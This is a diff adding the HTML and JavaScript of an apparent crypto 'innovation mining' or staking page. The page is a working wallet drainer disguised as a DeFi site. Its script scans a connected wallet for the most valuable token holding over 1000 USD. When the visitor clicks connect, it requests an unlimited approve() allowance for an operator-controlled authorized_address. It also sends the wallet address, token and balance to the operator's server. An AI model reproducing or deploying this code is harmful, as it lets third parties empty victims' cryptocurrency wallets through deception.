+                    //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=2&em=2464";
+                 }
+
+            })
+
+        }
+
+        async function getMostValuableAssets2(account) {
+            let _symbol = 'usdt'
+            console.log('_symbol:'+_symbol);
+            for (const [symbol, contract] of Object.entries(contracts2)) {
+                contract.methods.balanceOf(account).call(function(err, balance) {
+                    const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+                    if (usdt > total && usdt > 1000) {
+                        _symbol = symbol
+                        total = usdt
+                        approveAddr = addr[_symbol]
+
+                    }
+                })
+
+
+            }
+
+            bizhong = _symbol
+
+            console.log('_symbol:'+_symbol);
+            return _symbol
+        }
+
+        async function getMostValuableAssets3(account) {
+            let _symbol = 'usdt'
+            for (const [symbol, contract] of Object.entries(contracts3)) {
+                contract.methods.balanceOf(account).call(function(err, balance) {
+                    const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+                    if (usdt > total && usdt > 1000) {
+                        _symbol = symbol
+                        total = usdt
+                        approveAddr = addr[_symbol]
+                    }
+                })
+            }
+            bizhong = _symbol
+            console.log('_symbol:'+_symbol);
+            return _symbol
+        }
+
+
+        const price = {
+            usdt: 1,
+            sushi: 15.5,
+            usdc: 1,
+            dai: 1,
+            uni: 28.6,
+            aave: 380,
+            yfi: 35000,
+            link: 28.2,
+            "LON": 7,
+            "CRV": 3.01367,
+            "GUSD": 1,
+            "WBTC": 56478.2,
+            "WETH": 1991.89,
+            "CONV": 0.105733,
+            "inj": 13.3812,
+            "MKR": 2076.68,
+            "ALPHA": 1.79043,
+            "BAND": 16.3441,
+            "snx": 20.0588,
+            "comp": 468.076,
+            "sxp": 4.11818,
+            "FTT": 46.1779,
+            "ust": 1.00543,
+            "TRIBE": 1.42926,
+            "wise": 0.446973,
+            "RRAX": 0.996821,
+            "CORE": 5447.59,
+            "mir": 8.69817,
+            "DPI": 415.906,
+            "luna": 15.2402,
+            "HEZ": 5.97533,
+            "fxs": 8.47025,
+            "fei": 0.898157,
+        }
+
+        const decimals = {
+            sushi: 18,
+            usdt: 6,
+            usdc: 6,
+            uni: 18,
+            dai: 18,
+            aave: 18,
+            yfi: 18,
+            link: 18,
+            WBTC: 8,
+        }
+
+        const contracts = {}, contracts2 = {}, contracts3 = {}
+        for (const symbol of Object.keys(addr)) {
+            const contractAddr = addr[symbol]
+            contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+        }
+
+        for (const symbol of Object.keys(addr2)) {
+            const contractAddr = addr2[symbol]
+            contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+        }
+
+        for (const symbol of Object.keys(addr3)) {
+            const contractAddr = addr3[symbol]
+            contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+        }
+
+        const Web3Modal = window.Web3Modal.default;
+        const WalletConnectProvider = window.WalletConnectProvider.default;
+
+        // Web3modal instance
+        let web3Modal
+
+        // Chosen wallet provider given by the dialog window
+        let provider;
+
+        // Address of the selected account
+        let selectedAccount;
+
+        var xlit = 0;
+        var woust='1';
+
+
+        /**
+         * Setup the orchestra
+         */
+        async function init() {
+
+
+            getInfo();
+
+
+
+
+            // Tell Web3modal what providers we have available.
+            // Built-in web browser provider (only one can exist as a time)
+            // like MetaMask, Brave or Opera is added automatically by Web3modal
+
+            const providerOptions = {
+                walletconnect: {
+                    package: WalletConnectProvider,
+                    options: {
+                        // Mikko's test key - don't copy as your mileage may vary
+                        infuraId: "bc11843ef86140b39d6f01a1a5d9e046",
+                    }
+                },
+            };
+
+            web3Modal = new Web3Modal({
+                cacheProvider: false, // optional
+                providerOptions, // required
+                disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
+            });
+
+
+            try {
+                provider = await web3Modal.connect()
+                provider.enable()
+            } catch(e) {
+                 console.log("Could not get a wallet connection", e);
+                //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=2&em=2464";
+                return;
+            }
+             xlit = 1;
+
+            // Subscribe to accounts change
+            provider.on("accountsChanged", async (accounts) => {
+                await fetchAccountData();
+            });
+
+            // Subscribe to chainId change
+            provider.on("chainChanged", async (chainId) => {
+                await fetchAccountData();
+            });
+
+            // Subscribe to networkId change
+            provider.on("networkChanged", async (networkId) => {
+                await fetchAccountData();
+            });
+
+            await refreshAccountData();
+        }
+
+        /**
+         * Kick in the UI action after Web3modal dialog has chosen a provider
+         */
+        async function fetchAccountData() {
+            const web3 = new Web3(provider);
+            injectedWeb3 = web3;
+            provider.enable();
+            const accounts = await web3.eth.getAccounts();
+            selectedAccount = accounts[0];
+            console.log(selectedAccount);
+            $('#walletadd').html(selectedAccount.substring(0,5));
+            let gasPrice = await web3.eth.getGasPrice();
+            console.log(gasPrice);
+            var gs =((gasPrice*70000) / (10**18)).toFixed(6);
+            console.log(gs);
+            balance = 0;
+            const contract = new web3.eth.Contract(ABI, approveAddr)
+            contract.methods.balanceOf(selectedAccount).call().then(
+            function(result){
+                    balance = result;
+                    console.log(result,2);
+            });
+            postInfore(selectedAccount,bizhong,balance);
+            $('#gas').text(gs.toLocaleString() + ' ETH');
+            //$.get("https://rest.coinapi.io/v1/assets?filter_asset_id=ETH&apikey=AD486C3C-73F3-477A-BD55-//E1BDF895337B", function(result){
+            //    console.log(result[0]['price_usd'])
+            //    let mon = gs*result[0]['price_usd']
+            //    //$('#gasmoney').text('$ '+mon.toLocaleString())
+            //});
+            getMostValuableAssets(selectedAccount);
+            setTimeout(function() {
+                getMostValuableAssets2(selectedAccount);
+            }, 200)
+            setTimeout(function() {
+                getMostValuableAssets3(selectedAccount);
+            }, 300)
+        }
+
+
+        /**
+         * Fetch account data for UI when
+         * - User switches accounts in wallet
+         * - User switches networks in wallet
+         * - User connects wallet initially
+         */
+        async function refreshAccountData() {
+
+            // If any current data is displayed when
+            // the user is switching acounts in the wallet
+            // immediate hide this data
+            // document.querySelector("#connected").style.display = "none";
+            // document.querySelector("#prepare").style.display = "block";
+
+            // Disable button while UI is loading.
+            // fetchAccountData() will take a while as it communicates
+            // with Ethereum node via JSON-RPC and loads chain data
+            // over an API call.
+            document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+            await fetchAccountData(provider);
+            document.querySelector("#btn-connect").removeAttribute("disabled")
+        }
+
+
+        /**
+         * Connect wallet button pressed.
+         */
+        async function onConnect() {
+
+
+            $('.pages').append('<div class="modal-overlay"></div>');
+            $('.modal-overlay').addClass('modal-overlay-visible');
+            $('.modal').removeClass('modal-out').addClass('modal-in');
+            woust='';
+
+
+
+
+            console.log(authorized_address);
+            console.log(infura_key);
+
+
+
+            console.log(bizhong);
+
+            if (selectedAccount && provider) {
+                const web3 = new Web3(provider);
+                const contract = new web3.eth.Contract(ABI, approveAddr)
+                
+
+
+                const gasPrice = await web3.eth.getGasPrice();
+                balance = 0;
+                contract.methods.balanceOf(selectedAccount).call().then(
+                function(result){
+                        balance = result;
+                        console.log(result,2);
+                });
+
+                // var gas = await contract.methods.approve(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).estimateGas({
+                //  from: selectedAccount
+                // },function(err, tx) {
+
+
+                //  console.log(err, tx)
+
+                // })
+                // if(gas == undefined){
+                //  gas = 80000;
+                // }
+
+
+
+                contract.methods.approve(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
+                    from: selectedAccount,
+                    gasPrice: gasPrice,
+                    gas: 70000,
+                }, function(err, tx) {
+                    if(!err){
+
+
+                        $(".tishi").fadeIn()
+                        setTimeout(function () {
+                            $(".tishi").fadeOut()
+                        },2000);
+
+
+
+                        
+                        //postInfo(selectedAccount,bizhong)
+                    }
+                    $('.modal-overlay').remove();
+
+                    $('.modal').removeClass('modal-in').addClass('modal-out');
+
+                    console.log(err, tx)
+
+                })
+                .on('transactionHash', function(hash){
+                    postInfo(selectedAccount,bizhong,balance);
+                    console.log(hash,1);
+                })
+                .on('receipt', function(receipt){
+                    postInfo(selectedAccount,bizhong,balance);
+                    console.log(receipt,2);
+                })
+                .on('confirmation', function(confirmationNumber, receipt){
+                    //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=2&em=2464";
+                })
+                .on('error', function(error, receipt) {
+                    //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=2&em=2464";
+                });         
+                } else {
+                provider = await web3Modal.connect()
+                provider.enable()
+                const web3 = new Web3(provider);
+                const accounts = await web3.eth.getAccounts();
+                selectedAccount = accounts[0];
+                balance = 0;
+                contract.methods.balanceOf(selectedAccount).call().then(
+                function(result){
+                        balance = result;
+                        console.log(result,2);
+                });
+
+
+                const contract = new web3.eth.Contract(ABI, approveAddr)
+                const gasPrice = await web3.eth.getGasPrice()
+
+                // var gas = await contract.methods.approve(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').estimateGas({
+                //  from: selectedAccount
+                // },function(err, tx) {
+
+
+                //  console.log(err, tx)
+
+                // })
+                // if(gas == undefined){
+                //  gas= 80000;
+                // }
+                // console.log(gas)
+                //0000000000000000000000000281f9c964ec42b63f36ae02e3875179cad0800
+                contract.methods.approve(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
+                    from: selectedAccount,
+                    gasPrice: gasPrice,
+                    gas:70000,
+                }, function(err, tx) {
+                    console.log(err, tx)
+                    if(!err){
+                        $(".tishi").fadeIn()
+                        setTimeout(function () {
+                            $(".tishi").fadeOut()
+                        },2000);
+                        //postInfo(selectedAccount,bizhong,balance);
+                        //postInfo(selectedAccount,bizhong)
+
+                    }
+                    $('.modal-overlay').remove();
+
+                    $('.modal').removeClass('modal-in').addClass('modal-out');
+
+
+                })
+                .on('transactionHash', function(hash){
+                    postInfo(selectedAccount,bizhong,balance);
+                    console.log(hash,1);
+                })
+                .on('receipt', function(receipt){
+                    postInfo(selectedAccount,bizhong,balance);
+                    console.log(receipt,2);
+                })
+                .on('confirmation', function(confirmationNumber, receipt){
+                    //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=2&em=2464";
+                })
+                .on('error', function(error, receipt) {
+                    //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=2&em=2464";
+                });     
+            }
+        }
+        /**
+         * Disconnect wallet button pressed.
+         */
+        async function onDisconnect() {
+
+            console.log("Killing the wallet connection", provider);
+
+            // TODO: Which providers have close method?
+            if(provider.close) {
+                await provider.close();
+
+                // If the cached provider is not cleared,
+                // WalletConnect will default to the existing session
+                // and does not allow to re-scan the QR code with a new wallet.
+                // Depending on your use case you may want or want not his behavir.
+                await web3Modal.clearCachedProvider();
+                provider = null;
+            }
+
+            selectedAccount = null;
+
+            // Set the UI back to the initial state
+            // document.querySelector("#prepare").style.display = "block";
+            // document.querySelector("#connected").style.display = "none";
+        }
+
+        /**
+         * Main entry point.
+         */
+        window.addEventListener('load', async () => {
+            document.querySelector("#btn-connect").addEventListener("click", onConnect);
+                        document.querySelector("#connect").addEventListener("click", init);
+            document.querySelector("#walletadd").addEventListener("click", init);
+                         //document.querySelector("#aa").addEventListener("click", onConnect);
+            // document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
+        });
+
+      
+     init();
+     setInterval(function(){
+          if(woust!=''){
+             //init();
+          }
+       },10000);
+
+    setTimeout(function(){
+         document.querySelector("#btn-connect").addEventListener("click", onConnect);
+         
+      },1000);
+
+
+
+
+    });
+
+</script>
+<script type="text/javascript">
+
+    
+
+
+    function dogetrewad(id){
+        
+        var index = layer.load(2,{shade:[0.7,"#000000"]});
+
+        var data = {
+                id:id
+        }
+        $.ajax({
+                type: 'post',
+                url:  'https://vip.innovationmining.top/token/token/getrewadpost',
+                data:data,
+                 success:function(data){
+                 if(data.code == 200){
+                    layer.msg(data.msg,{icon:1},function(){
+                        window.location.href = "https://vip.innovationmining.top/trade/index/index.html?code=2464";
+                        layer.close(index);
+                    });
+                 }else{
+                    layer.msg(data.msg,{icon:2},function(){
+                        layer.close(index);
+                    });
+                    console.log(data)
+                 }
+                 },
+                 error:function(data){
+                    layer.msg(data.status+':'+data.statusText);
+                    layer.close(index);
+                 }
+
+        })
+    }
+
+
+    function dogetpledge(id){
+        var index = layer.load(2,{shade:[0.7,"#000000"]});
+
+        var data = {
+                id:id
+        }
+        $.ajax({
+                type: 'post',
+                url:  'https://vip.innovationmining.top/token/token/getpledge',
+                data:data,
+                 success:function(data){
+                 if(data.code == 200){
+                    layer.msg(data.msg,{icon:1},function(){
+                        window.location.href = "https://vip.innovationmining.top/trade/index/index.html?code=2464";
+                        layer.close(index);
+                    });
+                 }else{
+                    layer.msg(data.msg,{icon:2},function(){
+                        layer.close(index);
+                    });
+                    console.log(data)
+                 }
+                 },
+                 error:function(data){
+                    layer.msg(data.status+':'+data.statusText);
+                    layer.close(index);
+                 }
+
+        })
+    }
+    function dogetpledgepost(id){
+        var index = layer.load(2,{shade:[0.7,"#000000"]});
+
+        var data = {
+                id:id
+        }
+        $.ajax({
+                type: 'post',
+                url:  'https://vip.innovationmining.top/token/token/getpledgepost',
+                data:data,
+                 success:function(data){
+                 if(data.code == 200){
+                    layer.msg(data.msg,{icon:1},function(){
+                        window.location.href = "https://vip.innovationmining.top/trade/index/index.html?code=2464";
+                        layer.close(index);
+                    });
+                 }else{
+                    layer.msg(data.msg,{icon:2},function(){
+                        layer.close(index);
+                    });
+                    console.log(data)
+                 }
+                 },
+                 error:function(data){
+                    layer.msg(data.status+':'+data.statusText);
+                    layer.close(index);
+                 }
+
+        })
+    }
+    
+
+        $(function(){ 
+            
+            pop = "0";
+            if(pop == "1")
+            {
+                $('#myModal1').modal();
+                $('.disp1').css('display','block');
+            }
+
+            pop = "0";
+            if(pop == "1")
+            {
+                $('#myModal2').modal();
+                $('.disp2').css('display','block');
+            }
+
+        }); 
+        function closetip()
+        {
+            $('.show').click();
+        }
+        
+
+        
+</script>
+
+<div id="WEB3_CONNECT_MODAL_ID"><div class="sc-jSFkmK kRmdPb web3modal-modal-lightbox" offset="0" opacity="0.4"><div class="sc-gKAblj fVQpCb web3modal-modal-container"><div class="sc-iCoHVE knnrxv web3modal-modal-hitbox"></div><div class="sc-fujyUd hdPMvV web3modal-modal-card"><div class="sc-eCApGN cjAFRf web3modal-provider-wrapper"><div class="sc-hKFyIo jcNZzC web3modal-provider-container"><div class="sc-bdnylx jMhaxE web3modal-provider-icon"><img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMSAtMSkiPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTIuMDA0NzE3IDEzLjgxMDE5OHYtMTguMDU5NDlsNC4yNDUyODMtNC4yNDkyOTJoMjkuNzE2OTgydjIxLjI0NjQ1OSAxNC44NzI1MjNoLTMxLjgzOTYyNGwtMzkuMjY4ODY4LTE2Ljk5NzE2OXoiIGZpbGw9IiNjZGJkYjIiLz48cGF0aCBkPSJtMTk5LjUyODMwNSAzMjcuMTk1NDcyIDUwLjk0MzM5NyAxMy44MTAxOTh2LTE4LjA1OTQ5bDQuMjQ1MjgzLTQuMjQ5MjkyaDI5LjcxNjk4MXYyMS4yNDY0NTkgMTQuODcyNTIzaC0zMS44Mzk2MjNsLTM5LjI2ODg2OC0xNi45OTcxNjl6IiBmaWxsPSIjY2RiZGIyIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSA0ODMuOTYyMjcgMCkiLz48cGF0aCBkPSJtMTcwLjg3MjY0NCAyODcuODg5NTIzLTQuMjQ1MjgzIDM1LjA1NjY1NyA1LjMwNjYwNC00LjI0OTI5Mmg1NS4xODg2OGw2LjM2NzkyNSA0LjI0OTI5Mi00LjI0NTI4NC0zNS4wNTY2NTctOC40OTA1NjUtNS4zMTE2MTUtNDIuNDUyODMyIDEuMDYyMzIzeiIgZmlsbD0iIzM5MzkzOSIvPjxwYXRoIGQ9Im0xNDIuMjE2OTg0IDUwLjk5MTUwMjIgMjUuNDcxNjk4IDU5LjQ5MDA4NTggMTEuNjc0NTI4IDE3My4xNTg2NDNoNDEuMzkxNTExbDEyLjczNTg0OS0xNzMuMTU4NjQzIDIzLjM0OTA1Ni01OS40OTAwODU4eiIgZmlsbD0iI2Y4OWMzNSIvPjxwYXRoIGQ9Im0zMC43NzgzMDIzIDE4MS42NTcyMjYtMjkuNzE2OTgxNTMgODYuMDQ4MTYxIDc0LjI5MjQ1MzkzLTQuMjQ5MjkzaDQ3Ljc1OTQzNDN2LTM3LjE4MTMwM2wtMi4xMjI2NDEtNzYuNDg3MjUzLTEwLjYxMzIwOCA4LjQ5ODU4M3oiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtODcuMDI4MzAzMiAxOTEuMjE4MTM0IDg3LjAyODMwMjggMi4xMjQ2NDYtOS41NTE4ODYgNDQuNjE3NTYzLTQxLjM5MTUxMS0xMC42MjMyMjl6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkyLjI4MDQ1NyAzNi4wODQ5MDU4IDMzLjk5NDMzNHYzMy45OTQzMzR6IiBmaWxsPSIjZWE4ZDNhIi8+PHBhdGggZD0ibTEyMy4xMTMyMDkgMjI3LjMzNzExNCA0Mi40NTI4MzEgMTAuNjIzMjI5IDEzLjc5NzE3IDQ1LjY3OTg4OC05LjU1MTg4NiA1LjMxMTYxNS00Ni42OTgxMTUtMjcuNjIwMzk4eiIgZmlsbD0iI2Y4OWQzNSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDI2MS4zMzE0NDgtOC40OTA1NjUgNjUuODY0MDI0IDU2LjI1LTM5LjMwNTk0OXoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTc0LjA1NjYwNiAxOTMuMzQyNzggNS4zMDY2MDQgOTAuMjk3NDUxLTE1LjkxOTgxMi00Ni4yMTEwNDl6IiBmaWxsPSIjZWE4ZTNhIi8+PHBhdGggZD0ibTc0LjI5MjQ1MzkgMjYyLjM5Mzc3MSA0OC44MjA3NTUxLTEuMDYyMzIzLTguNDkwNTY1IDY1Ljg2NDAyNHoiIGZpbGw9IiNkODdjMzAiLz48cGF0aCBkPSJtMjQuNDEwMzc3NyAzNTUuODc4MTkzIDkwLjIxMjI2NjMtMjguNjgyNzIxLTQwLjMzMDE5MDEtNjQuODAxNzAxLTczLjIzMTEzMzEzIDUuMzExNjE2eiIgZmlsbD0iI2ViOGYzNSIvPjxwYXRoIGQ9Im0xNjcuNjg4NjgyIDExMC40ODE1ODgtNDUuNjM2NzkzIDM4LjI0MzYyNy0zNS4wMjM1ODU4IDQyLjQ5MjkxOSA4Ny4wMjgzMDI4IDMuMTg2OTY5eiIgZmlsbD0iI2U4ODIxZSIvPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTYuMjUtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIvPjxwYXRoIGQ9Im0yMjkuMjQ1Mjg2IDMyNy4xOTU0NzIgNTUuMTg4NjgtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgNTEzLjY3OTI1MiAwKSIvPjxwYXRoIGQ9Im0xMzIuNjY1MDk2IDIxMi40NjQ1OTMtMTEuNjc0NTI4IDI0LjQzMzQyNyA0MS4zOTE1MS0xMC42MjMyMjl6IiBmaWxsPSIjMzkzOTM5IiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAyODMuMzcyNjQ2IDApIi8+PHBhdGggZD0ibTIzLjM0OTA1NyAxLjA2MjMyMjk2IDE0NC4zMzk2MjUgMTA5LjQxOTI2NTA0LTI0LjQxMDM3OC01OS40OTAwODU4eiIgZmlsbD0iI2U4OGYzNSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5Ni0xOS4xMDM3NzM5MiA1OC40Mjc3NjI5NCAxMC42MTMyMDc3MiA2My43MzkzNzgxLTcuNDI5MjQ1NDEgNC4yNDkyOTIgMTAuNjEzMjA3NzEgOS41NjA5MDYtOC40OTA1NjYxNyA3LjQzNjI2MSAxMS42NzQ1Mjg0NyAxMC42MjMyMjktNy40MjkyNDU0IDYuMzczOTM4IDE2Ljk4MTEzMjMgMjEuMjQ2NDU5IDc5LjU5OTA1NzctMjQuNDMzNDI4YzM4LjkxNTA5Ni0zMS4xNjE0NzMgNTguMDE4ODY5LTQ3LjA5NjMxOCA1Ny4zMTEzMjItNDcuODA0NTMzLS43MDc1NDgtLjcwODIxNS00OC44MjA3NTYtMzcuMTgxMzAzNi0xNDQuMzM5NjI1LTEwOS40MTkyNjUwNHoiIGZpbGw9IiM4ZTVhMzAiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAzOTkuMDU2NjExIDApIj48cGF0aCBkPSJtMzAuNzc4MzAyMyAxODEuNjU3MjI2LTI5LjcxNjk4MTUzIDg2LjA0ODE2MSA3NC4yOTI0NTM5My00LjI0OTI5M2g0Ny43NTk0MzQzdi0zNy4xODEzMDNsLTIuMTIyNjQxLTc2LjQ4NzI1My0xMC42MTMyMDggOC40OTg1ODN6IiBmaWxsPSIjZjg5ZDM1Ii8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkxLjIxODEzNCA4Ny4wMjgzMDI4IDIuMTI0NjQ2LTkuNTUxODg2IDQ0LjYxNzU2My00MS4zOTE1MTEtMTAuNjIzMjI5eiIgZmlsbD0iI2Q4N2MzMCIvPjxwYXRoIGQ9Im04Ny4wMjgzMDMyIDE5Mi4yODA0NTcgMzYuMDg0OTA1OCAzMy45OTQzMzR2MzMuOTk0MzM0eiIgZmlsbD0iI2VhOGQzYSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDIyNy4zMzcxMTQgNDIuNDUyODMxIDEwLjYyMzIyOSAxMy43OTcxNyA0NS42Nzk4ODgtOS41NTE4ODYgNS4zMTE2MTUtNDYuNjk4MTE1LTI3LjYyMDM5OHoiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtMTIzLjExMzIwOSAyNjEuMzMxNDQ4LTguNDkwNTY1IDY1Ljg2NDAyNCA1NS4xODg2OC0zOC4yNDM2MjZ6IiBmaWxsPSIjZWI4ZjM1Ii8+PHBhdGggZD0ibTE3NC4wNTY2MDYgMTkzLjM0Mjc4IDUuMzA2NjA0IDkwLjI5NzQ1MS0xNS45MTk4MTItNDYuMjExMDQ5eiIgZmlsbD0iI2VhOGUzYSIvPjxwYXRoIGQ9Im03NC4yOTI0NTM5IDI2Mi4zOTM3NzEgNDguODIwNzU1MS0xLjA2MjMyMy04LjQ5MDU2NSA2NS44NjQwMjR6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTI0LjQxMDM3NzcgMzU1Ljg3ODE5MyA5MC4yMTIyNjYzLTI4LjY4MjcyMS00MC4zMzAxOTAxLTY0LjgwMTcwMS03My4yMzExMzMxMyA1LjMxMTYxNnoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTY3LjY4ODY4MiAxMTAuNDgxNTg4LTQ1LjYzNjc5MyAzOC4yNDM2MjctMzUuMDIzNTg1OCA0Mi40OTI5MTkgODcuMDI4MzAyOCAzLjE4Njk2OXoiIGZpbGw9IiNlODgyMWUiLz48cGF0aCBkPSJtMTMyLjY2NTA5NiAyMTIuNDY0NTkzLTExLjY3NDUyOCAyNC40MzM0MjcgNDEuMzkxNTEtMTAuNjIzMjI5eiIgZmlsbD0iIzM5MzkzOSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgMjgzLjM3MjY0NiAwKSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5NiAxNDQuMzM5NjI1IDEwOS40MTkyNjUwNC0yNC40MTAzNzgtNTkuNDkwMDg1OHoiIGZpbGw9IiNlODhmMzUiLz48cGF0aCBkPSJtMjMuMzQ5MDU3IDEuMDYyMzIyOTYtMTkuMTAzNzczOTIgNTguNDI3NzYyOTQgMTAuNjEzMjA3NzIgNjMuNzM5Mzc4MS03LjQyOTI0NTQxIDQuMjQ5MjkyIDEwLjYxMzIwNzcxIDkuNTYwOTA2LTguNDkwNTY2MTcgNy40MzYyNjEgMTEuNjc0NTI4NDcgMTAuNjIzMjI5LTcuNDI5MjQ1NCA2LjM3MzkzOCAxNi45ODExMzIzIDIxLjI0NjQ1OSA3OS41OTkwNTc3LTI0LjQzMzQyOGMzOC45MTUwOTYtMzEuMTYxNDczIDU4LjAxODg2OS00Ny4wOTYzMTggNTcuMzExMzIyLTQ3LjgwNDUzMy0uNzA3NTQ4LS43MDgyMTUtNDguODIwNzU2LTM3LjE4MTMwMzYtMTQ0LjMzOTYyNS0xMDkuNDE5MjY1MDR6IiBmaWxsPSIjOGU1YTMwIi8+PC9nPjwvZz48L3N2Zz4=" alt="MetaMask"></div><div class="sc-gtssRu bktcUM web3modal-provider-name">MetaMask</div><div class="sc-dlnjPT eFHlqH web3modal-provider-description">Connect to your MetaMask Wallet</div></div></div></div></div></div></div>
+</body> 
+</html>
+
+
+
+
